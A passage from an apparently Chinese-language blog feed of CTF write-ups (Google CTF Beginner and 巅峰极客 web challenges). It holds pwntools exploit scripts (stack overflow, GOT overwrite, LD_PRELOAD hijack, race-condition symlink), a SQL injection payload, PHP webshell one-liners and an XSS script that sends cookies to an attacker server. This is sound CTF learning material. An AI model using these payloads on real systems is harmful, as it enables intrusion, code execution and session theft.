class="number">0xb0</span>, <span class="number">0xa8</span>, <span class="number">0xb5</span>, <span class="number">0x83</span>, <span class="number">0xbd</span>, <span class="number">0x98</span>, <span class="number">0x85</span>, <span class="number">0xa2</span>, <span class="number">0xb3</span>, <span class="number">0xb3</span>, <span class="number">0xa2</span>, <span class="number">0xb5</span>, <span class="number">0x98</span>, <span class="number">0xb3</span>, <span class="number">0xaf</span>, <span class="number">0xf3</span>, <span class="number">0xa9</span>, <span class="number">0x98</span>, <span class="number">0xf6</span>, <span class="number">0x98</span>, <span class="number">0xac</span>, <span class="number">0xf8</span>, <span class="number">0xba</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> e_string:</span><br><span class="line">    s ^= <span class="number">0xc7</span></span><br><span class="line">    flag += chr(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><img src="/2018/08/15/google-ctf-beginner-part2/9.png"><h2 id="Admin-UI-3-PWN-RE"><a href="#Admin-UI-3-PWN-RE" class="headerlink" title="Admin UI 3(PWN+RE)"></a>Admin UI 3(PWN+RE)</h2><p>这里有两个漏洞点，第一个是格式化字符串漏洞，第二个是栈溢出漏洞，我这里是使用的是栈溢出漏洞。</p><img src="/2018/08/15/google-ctf-beginner-part2/10.png"><p>看到缓冲区的位置离bp寄存器有0x30的距离。</p><img src="/2018/08/15/google-ctf-beginner-part2/11.png"><p>又因为是64位程序，所以再加上8个字节的RBP，最后加上我们的geishell函数地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'mngmnt-iface.ctfcompetition.com'</span>,<span class="number">1337</span>)</span><br><span class="line">shell_add = <span class="number">0x41414349</span></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"1\n\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"password"</span>)</span><br><span class="line">r.send(<span class="string">"CTF&#123;I_luv_buggy_sOFtware&#125;\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"password"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">35</span>+<span class="string">"\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Authenticated"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">0x38</span> + p64(shell_add))</span><br><span class="line">r.send(<span class="string">"quit\n"</span>)</span><br><span class="line">r.send(<span class="string">"quit\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><img src="/2018/08/15/google-ctf-beginner-part2/12.png"><h2 id="Firmware-RE"><a href="#Firmware-RE" class="headerlink" title="Firmware(RE)"></a>Firmware(RE)</h2><p>虽然标签写的是RE但是……，做完的感觉就是一个MISC。</p><p>首先拿到一个zip文件，解压之后是一个gz压缩包，再次解压得到ext4的文件，搜索之后得知是一个Linux的文件系统。直接挂载之，<code>mount -t ext4 challenge2.ext4 /mnt</code>，需要root权限。挂载之后寻找线索，找了一圈在根目录下有个隐藏压缩文件<code>.mediapc_backdoor_password.gz</code>，解压cat一下，得到flag。</p><img src="/2018/08/15/google-ctf-beginner-part2/13.png"><h2 id="Gatekeepker-RE"><a href="#Gatekeepker-RE" class="headerlink" title="Gatekeepker(RE)"></a>Gatekeepker(RE)</h2><p>一个简单的字符串逆序程序，有两个参数，第二个参数会被逆序，然后和<code>zLl1ks_d4m_T0g_I</code>比较，这样就简单了，直接逆转回来就好。</p><img src="/2018/08/15/google-ctf-beginner-part2/14.png"><img src="/2018/08/15/google-ctf-beginner-part2/15.png"><h2 id="Media-DB-MISC"><a href="#Media-DB-MISC" class="headerlink" title="Media-DB(MISC)"></a>Media-DB(MISC)</h2><p>给了一个python文件，大概的功能是能记录歌手和歌曲的一个简易控制台，要我们获取oauth_token。在输入点中过滤了单引号，而且输入点只有一个没有办法使用\来转义单引号逃逸字符串，所以这里只能寻找其他思路来突破。</p><img src="/2018/08/15/google-ctf-beginner-part2/16.png"><p>观察到这里有一个从数据库随机读歌手的操作，再加上之前的操作单引号，双引号过滤不一致。</p><img src="/2018/08/15/google-ctf-beginner-part2/17.png"><p>那么这里的不一致性就会造成二阶注入，我们可以在过滤双引号的输入点中注入带有单引号的数据，然后在随机读歌手的时候单引号会被代入SQL语句中造成SQL注入。</p><p><code>xxxx&#39; union select 1,oauth_token from oauth_tokens --</code></p><p>这里顺带一提不能使用#注释符，因为#符号在python中也是注释符会破坏语法。</p><img src="/2018/08/15/google-ctf-beginner-part2/18.png"><h2 id="Filter-env-PWN"><a href="#Filter-env-PWN" class="headerlink" title="Filter env(PWN)"></a>Filter env(PWN)</h2><p>给了C的源代码，主要操作就是设置环境变量，代码中过滤了一些常见的环境变量。</p><img src="/2018/08/15/google-ctf-beginner-part2/19.png"><p>问题出在这个过滤只执行一次，所以我们重复设置环境变量就可以了。这里是利用LD_PRELOAD劫持函数，执行我们编译的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __libc_start_main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *arg[] = &#123;<span class="string">"/bin/cat"</span>, <span class="string">"/home/adminimum/flag"</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    execve(arg[<span class="number">0</span>], arg, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc load.c -o load -shared -fPIC</code>生成动态链接文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">load_file = base64.b64encode(open(<span class="string">"load"</span>, <span class="string">"rb"</span>).read())</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"env.ctfcompetition.com"</span>, <span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"cd /tmp\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo '"</span> + load_file + <span class="string">"' &gt; load.txt\n"</span>)</span><br><span class="line">r.send(<span class="string">"base64 -d load.txt &gt; load.so\n"</span>)</span><br><span class="line">r.send(<span class="string">"/home/adminimum/filterenv\n"</span>)</span><br><span class="line">r.send(<span class="string">"LD_PRELOAD=/tmp\n"</span>)</span><br><span class="line">r.send(<span class="string">"LD_PRELOAD=/tmp/load.so\n"</span>)</span><br><span class="line">r.send(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><img src="/2018/08/15/google-ctf-beginner-part2/20.png"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学到了一些PWN方面的知识还是不错的，丰富知识面。就是想吐槽这个题目的标签，很多都是挂羊头卖狗肉。</p><img src="/2018/08/15/google-ctf-beginner-part2/21.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Holey-Beep-PWN&quot;&gt;&lt;a href=&quot;#Holey-Beep-PWN&quot; class=&quot;headerlink&quot; title=&quot;Holey Beep(PWN)&quot;&gt;&lt;/a&gt;Holey Beep(PWN)&lt;/h2&gt;&lt;p&gt;Holey Beep是CVE-2018-
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>巅峰极客CTF 部分Web复现</title>
    <link href="https://hurricane618.me/2018/08/01/dianfengjikeCTF-web/"/>
    <id>https://hurricane618.me/2018/08/01/dianfengjikeCTF-web/</id>
    <published>2018-08-01T05:17:19.000Z</published>
    <updated>2018-08-01T05:23:31.869Z</updated>
    
    <content type="html"><![CDATA[<p>复现了三道题，其他的都关环境了，记录一下复现的这三道吧。</p><h2 id="A-Simple-CMS"><a href="#A-Simple-CMS" class="headerlink" title="A Simple CMS"></a>A Simple CMS</h2><p>在网上找到的onethink的漏洞分析文章</p><p><a href="https://bbs.ichunqiu.com/thread-4918-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-4918-1-1.html</a></p><p>这个是原理相同的，只不过是thinkphp</p><p><a href="https://xz.aliyun.com/t/99" target="_blank" rel="noopener">https://xz.aliyun.com/t/99</a></p><p>通过这些我们知道，问题是出在缓存的存储上，我们的用户名被简单的反序列化存储进了缓存文件中。所以要getshell的话我们只需要通过用户名传入webshell。但是这里有个条件，我们必须能猜到缓存文件的名字。</p><p>在题目的根目录下扫到 www.zip 得到题目的源码，在这里我们看到filename的命名规律，以及目录。推测这里的源码和线上是一样的，所以条件满足。</p><img src="/2018/08/01/dianfengjikeCTF-web/1.png"><p>我们在本地测试的时候，删除 Application/Install/Data/install.lock 文件，然后通过install.php安装，随后通过在本地生成缓存文件来预测题目的缓存文件，最后代码执行拿flag。</p><p>由于用户名有长度限制，所以分两次注册。第一次<code>%0a%0d$x=$_GET[x];\\</code>，第二次<code>%0a%0deval($x);\\</code></p><p>注册之后必须要登录一下，这样就把webshell写入了缓存文件中了。</p><img src="/2018/08/01/dianfengjikeCTF-web/2.png"><p>之后在题目中重复步骤，就可以拿到webshell，执行代码搜索flag</p><img src="/2018/08/01/dianfengjikeCTF-web/3.png"><h2 id="Baby-Web"><a href="#Baby-Web" class="headerlink" title="Baby Web"></a>Baby Web</h2><p>这道题一开始想法是通过收集信息社工得到flag……，先是看到<a href="mailto:BabyWeb@my.lol" target="_blank" rel="noopener">BabyWeb@my.lol</a>，然后访问my.lol可以得到一个qq邮箱，结果这个qq没什么东西，思路就断在这里了。</p><p>参考了其他人的writeup，发现要通过这些信息猜测后台，爆破密码……像这种信息量较少的题目，都会有一些扫目录，扫端口，收集子域名之类的操作。</p><p>输入<a href="http://106.75.2.4/babyweb" target="_blank" rel="noopener">http://106.75.2.4/babyweb</a> ，自动跳转到<a href="http://106.75.2.4/babyweb/login.php" target="_blank" rel="noopener">http://106.75.2.4/babyweb/login.php</a> ，看了一个writeup有的队伍能直接根据收集的信息爆破出用户名和密码。。。这操作太强了，我是搞不出来，所以就按照常规操作扫端口。</p><img src="/2018/08/01/dianfengjikeCTF-web/4.png"><p>根据扫出来的结果可以看到开放了3306端口，使用hydra爆破之。这个我在一开始的时候爆破的是root用户，结果看提示已经改成另外的用户了……哭唧唧，最后是在writeup的帮助下知道了用户名为babyweb，这个可以通过网站的信息推测出来。</p><p>拿到密码之后，连接数据库。</p><img src="/2018/08/01/dianfengjikeCTF-web/5.png"><p>然而并没有某writeup中所说的用户名密码，可能被删了，所以这里就只能直接用writeup中的用户名密码登后台了。</p><p>后台有个简单的文件上传，然后后缀有限制只能是图片后缀，这里上传之后没有路径，但是我们有数据库的数据，根据数据库中的数据我们可以得到上传后文件的文件名再加上img路径就可以知道文件的路径。再看看上传的类型中还有htaccesss，这里就是文件上传的漏洞利用。</p><p>通过上传htaccess文件来让一些后缀得到解析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;abc&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>最后上传.abc为后缀的webshell即可</p><img src="/2018/08/01/dianfengjikeCTF-web/6.png"><h2 id="pentest"><a href="#pentest" class="headerlink" title="pentest"></a>pentest</h2><p>网站使用metinfo模板，在网上搜索一番，看到了几个SQl注入的洞，试了试都不行，索性放弃，看writeup。</p><p>扫描目录扫出file/file.php，能删除文件，然后没有对..过滤导致可以跨目录删除文件…… emmmm 看来是为了比赛额外添加了一个文件删除，这个如果字典没扫出来就根本无法下手了。</p><p>删除文件的路径中有对<code>./</code>的过滤，所以最后删除的路径为<code>...//xxxx/xxx</code><br>扫到这个之后，在之前的metinfo漏洞里面有讲删除install.lock文件，导致重装的问题，再加上metinfo对数据库参数过滤不严的问题，只要数据库配置参数中任意一项填入一句话木马<code>#*/@eval($_REQUEST[xxx]);/*</code>，就可以成功getshell。</p><img src="/2018/08/01/dianfengjikeCTF-web/7.png"><p>虽然安装步骤没有走完，但是只要数据库创建成功，就可以通过config/config_db.php拿shell</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://url.cn/5HWdbfS" target="_blank" rel="noopener">http://url.cn/5HWdbfS</a></p><p><a href="https://mp.weixin.qq.com/s/DYnLhYpC2eASyouk1YA2zg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/DYnLhYpC2eASyouk1YA2zg</a></p><p><a href="https://xz.aliyun.com/t/2469" target="_blank" rel="noopener">https://xz.aliyun.com/t/2469</a></p><p><a href="https://www.safeinfo.me/ldgb/75.html" target="_blank" rel="noopener">https://www.safeinfo.me/ldgb/75.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;复现了三道题，其他的都关环境了，记录一下复现的这三道吧。&lt;/p&gt;
&lt;h2 id=&quot;A-Simple-CMS&quot;&gt;&lt;a href=&quot;#A-Simple-CMS&quot; class=&quot;headerlink&quot; title=&quot;A Simple CMS&quot;&gt;&lt;/a&gt;A Simple CMS&lt;/
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Google CTF Beginner Part1</title>
    <link href="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/"/>
    <id>https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/</id>
    <published>2018-07-18T15:03:09.000Z</published>
    <updated>2018-07-19T01:15:59.326Z</updated>
    
    <content type="html"><![CDATA[<p>会陆陆续续的把GoogleCTF题目的相关复现整理出来，这里先放一部分。通过这次Beginner训练还是了解到了许多之前没接触过的，比如PWN题中的libc地址问题。</p><h2 id="LETTER-MISC"><a href="#LETTER-MISC" class="headerlink" title="LETTER(MISC)"></a>LETTER(MISC)</h2><p>原理说出来都很简单，考察的是PDF中表层的覆盖其实还是可读的，所以我们选中需要的内容复制粘贴出来就可以了</p><img src="/2018/07/18/google-ctf-beginner-part1/1.png"><p>复制粘贴大法</p><img src="/2018/07/18/google-ctf-beginner-part1/2.png"><h2 id="OCR-is-cool-MISC"><a href="#OCR-is-cool-MISC" class="headerlink" title="OCR is cool!(MISC)"></a>OCR is cool!(MISC)</h2><p>一道题考察图片转文字之后，运用古典加密解决问题。学到新的知识OCR，PDF或者图片转文本的技术。</p><p><a href="https://www.onlineocr.net/" target="_blank" rel="noopener">在线转换链接</a></p><img src="/2018/07/18/google-ctf-beginner-part1/3.png"><p>之后在凯撒加密中破解，因为题目中包含着凯撒，提示也是很明显了。</p><img src="/2018/07/18/google-ctf-beginner-part1/4.png"><h2 id="MOAR-PWN"><a href="#MOAR-PWN" class="headerlink" title="MOAR(PWN)"></a>MOAR(PWN)</h2><p>考察了一个细节点，当我们处于man手册的状态下可以使用 !command 的方式来执行命令</p><img src="/2018/07/18/google-ctf-beginner-part1/5.png"><p>我们就直接ls出home目录下有东西，然后cat出来即可。</p><h2 id="Floppy-MISC"><a href="#Floppy-MISC" class="headerlink" title="Floppy(MISC)"></a>Floppy(MISC)</h2><p>给了一个图标文件，看了文本内容没什么东西，然后开始用binwalk分析一下</p><img src="/2018/07/18/google-ctf-beginner-part1/6.png"><p>果然里面有东西，改成zip解压出来就ok了</p><img src="/2018/07/18/google-ctf-beginner-part1/7.png"><h2 id="FLOPPY2-MISC"><a href="#FLOPPY2-MISC" class="headerlink" title="FLOPPY2(MISC)"></a>FLOPPY2(MISC)</h2><p>在上一道题目中留下了一个 <code>www.com</code> 文件，com后缀查了一下是MS-DOS的执行文件，所以现在的windows系统是无法执行的，DOSBOX启动！</p><p>直接运行就出现一个毫无意义的话，没有什么结果之后把二进制文件转成文本看看其中的内容，也没有什么收获……</p><p>经过其他人的Writeup之后得知要调试这个程序，在调试中发现，它会对其中的某个段取出字符异或然后重写回去，这样就好办了，一直跟踪调试，每次经过一些重写操作之后看看内存中的数据。最后得到flag。</p><img src="/2018/07/18/google-ctf-beginner-part1/8.png"><h2 id="Security-By-Obsecurity-MISC"><a href="#Security-By-Obsecurity-MISC" class="headerlink" title="Security By Obsecurity(MISC)"></a>Security By Obsecurity(MISC)</h2><p>一道很猥琐的题目…… 通过file命令知道得到的文件是个zip压缩包，然后就开始了，一直解压解压解压。。。</p><p>最后拿到一个password的压缩包里面有个password.txt需要密码，看他题目中有提示john，暗示John The Ripper，这个暴力破解工具。</p><p>所以我们就暴力一下吧，我这里用的是ARCHPR</p><img src="/2018/07/18/google-ctf-beginner-part1/9.png"><p>得到密码asdf，解压得到password.txt</p><img src="/2018/07/18/google-ctf-beginner-part1/10.png"><p>拿到flag</p><h2 id="Router-UI-Web"><a href="#Router-UI-Web" class="headerlink" title="Router-UI(Web)"></a>Router-UI(Web)</h2><p>打开网站是一个登录页面，输入账号和密码之后，发现会显示在页面上，根据题目的提示，XSS无疑。我们输入script验证漏洞，结果被chrome的auditor拦截。GG，这里img，svg等等标签失去作用，就算用src=javascript:alert(1) 这样的形式也会变成500……</p><p>无奈之前，看了看别人的writeup，发现它们是利用了页面中的//分隔符，把script拆成了两个部分，这样就绕过了auditor的检查。</p><p>那么可以引入js执行了，怎么偷管理员的cookie呢？必须要让管理员用这样的username和password登录才行，所以就是CSRF了。</p><p>给管理员一个可以自动提交的网站，提交这些内容，就会触发js拿到cookie。代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"https://router-ui.web.ctfcompetition.com/login?next=https%3A%2F%2Frouter-ui.web.ctfcompetition.com%2F"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"&lt;script src=https:"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"xxxxx/img/11.js&gt;&lt;/script&gt;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"b"</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"b"</span>).click();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在11.js中，放入偷cookie的语句。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">"http://xxxxxx/?c="</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><p>这样在我们的服务器的日志中就可以看到带有cookie的请求了。但是由于比赛已经结束，估计机器人也没了，所以只能直接抄wp中的cookie进入后台。</p><img src="/2018/07/18/google-ctf-beginner-part1/11.png"><p>添加cookie之后，重新登录就会进入控制页面了</p><img src="/2018/07/18/google-ctf-beginner-part1/12.png"><p>最后在网页中找到flag</p><p>在XSS的构造中利用//来包含链接比较有意思，其他的就是中规中矩的CSRF+XSS的连锁。</p><h2 id="Message-of-the-day-PWN"><a href="#Message-of-the-day-PWN" class="headerlink" title="Message of the day(PWN)"></a>Message of the day(PWN)</h2><p>先按照国际惯例检查一下程序的安全保护。</p><img src="/2018/07/18/google-ctf-beginner-part1/13.png"><p>开启了NX意味着无法在内存中无法执行代码，所以这里就没有办法写shellcode执行拿权限。分析之后发现输入点处有不安全的gets函数，所以我们是可以栈溢出的。</p><img src="/2018/07/18/google-ctf-beginner-part1/14.png"><p>但是，没有办法写shellcode，那么还有什么办法可以拿到flag呢，在分析程序时看到在选项4中会有读取flag的操作，必须是管理员才能执行。</p><p>既然无法写shellcode，那么我们覆盖返回地址用ret2libc的思路去拿flag，应该是行的，我们知道读取flag的函数地址，只要把返回地址覆盖成这个地址即可。</p><p>src是一个0x100的栈，要栈溢出的话就要padding A*(0x100 + SP寄存器的大小)</p><img src="/2018/07/18/google-ctf-beginner-part1/15.png"><p>发现是RSP64位寄存器，那么我们最后的padding就是 A*(0x100+8)，地址我们也查到了是 00000000606063A5，所以最终代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"motd.competition.com"</span>, <span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"2\n"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">0x108</span> + <span class="string">"\xA5\x63\x60\x60\x00\x00\x00\x00"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>运行一下，拿到flag</p><img src="/2018/07/18/google-ctf-beginner-part1/16.png"><h2 id="Poetry-PWN"><a href="#Poetry-PWN" class="headerlink" title="Poetry(PWN)"></a>Poetry(PWN)</h2><p>有趣的一道题，开启了栈保护，所以栈溢出是不存在了。那么看看IDA中的内容。</p><img src="/2018/07/18/google-ctf-beginner-part1/17.png"><p>其中的LD_BIND_NOW 在网上查出来的结果，当这个变量设置为1的时候，会让连接器在程序执行前把所有的函数地址都连接好。</p><p>然后会用readlink读取 /proc/self/exe 就可以获取当前程序的绝对路径，之后设置 LD_BIND_NOW为1，再次执行该程序。</p><p>这里有个trick，就是如果在程序执行readlink(/proc/self/exe )的时候改变源程序，那么readlink得到的内容就会变成 原路径+” (deleted)”</p><p>所以只要我们在程序运行时对它做改动，它的readlink就会是另外一个名称，然后利用新的名称执行我们想要的命令。</p><p>由于我们的flag在其他用户的目录中，我们无法读取，所以思路就是改动程序让它执行我们控制好的其他程序读取flag，我们是没有权限的，但是poetry有这个权限。</p><p>这里，我们先用ln链接 poetry，得到一个我们自己的poetry，随后ln -s 硬链接cat 命名为 poetry(deleted)，这样我们在执行我们链接的poetry flag，然后删除我们的链接程序，就会触发cat 读取flag，整个过程都是poetry用户的权限，所以没问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"poetry.ctfcompetition.com"</span>,<span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"ln -s /bin/cat '/home/user/poetry (deleted)'\n"</span>)</span><br><span class="line">r.send(<span class="string">"ln /home/poetry/poetry /home/user/poetry\n"</span>)</span><br><span class="line">r.send(<span class="string">"(/home/user/poetry /home/poetry/flag &amp;);rm /home/user/poetry\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>最后这个脚本要多跑几次，因为这个是条件竞争的漏洞，最后通过这个flag了解到CVE-2009-1894，这个洞的触发条件就是在我们执行程序的时候，正好删除了原始链接程序，然后使得readlink返回我们伪造的程序路径从而执行恶意操作。</p><img src="/2018/07/18/google-ctf-beginner-part1/18.png"><p>拿到flag CVE链接 <code>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1894</code></p><h2 id="Fridge-ToDo-List-PWN"><a href="#Fridge-ToDo-List-PWN" class="headerlink" title="Fridge ToDo List(PWN)"></a>Fridge ToDo List(PWN)</h2><p>开启了PIE，无法在内存中确定具体的地址了。现在先看看程序有什么功能，1-6个选项。</p><ol><li>打印列表</li><li>打印ToDo的任务</li><li>存储ToDo任务</li><li>删除ToDo任务</li><li>远程管理员</li><li>退出</li></ol><p>首先第一个选项，就仅仅是打印，没什么输入，放弃。</p><p>第二个第三个第四个会有编号输入，第二个有读操作，第三个有写操作，所以重点就是这两个。</p><p>第五个查看源码就知道只是一个幌子。</p><p>第六个没啥好说的，退出操作。</p><p>看到第二个和第三个操作中都有同样的代码</p><img src="/2018/07/18/google-ctf-beginner-part1/19.png"><p>这里只检查了是否大于最大数量，并没有限制是否小于0,。所以我们可以越界读和写。</p><p>通过IDA我们分析看到 todo从0x203140开始，间隔为0x30，那么往上面看看有什么可以读写的。</p><img src="/2018/07/18/google-ctf-beginner-part1/20.png"><p>不错，在.got.plt部分，我们可以读取到这三个函数的地址，泄露了函数地址，意味着我们可以得到libc的信息。</p><p>之后该怎么利用呢？这里我们看到atoi是每次我们输入编号都会调用的函数，atoi而且还在open的附近，那么我们可以把atoi覆盖成system执行我们的任意命令，造成命令执行。所以剩下的就简单了，执行写操作，通过之前泄露的libc得到system的地址，覆盖atoi的地址。代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack,pack</span><br><span class="line">r = remote(<span class="string">"fridge-todo-list.ctfcompetition.com"</span>,<span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"whz\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"2\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"read?"</span>)</span><br><span class="line">r.send(<span class="string">"-6\n"</span>)</span><br><span class="line">res = r.readuntil(<span class="string">"Hi whz,"</span>).splitlines()[<span class="number">0</span>]</span><br><span class="line">write_addr = res.split(<span class="string">':'</span>,<span class="number">1</span>)[<span class="number">1</span>][<span class="number">1</span>:].ljust(<span class="number">8</span>,chr(<span class="number">0</span>))</span><br><span class="line">write_addr = unpack(<span class="string">"&lt;Q"</span>,write_addr)[<span class="number">0</span>]</span><br><span class="line">base_addr = write_addr<span class="number">-0x910</span></span><br><span class="line">system_addr = base_addr + <span class="number">0x940</span></span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"3\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"entry?"</span>)</span><br><span class="line">r.send(<span class="string">"-4\n"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">8</span>+pack(<span class="string">"&lt;Q"</span>,system_addr)+<span class="string">"\n"</span>)</span><br><span 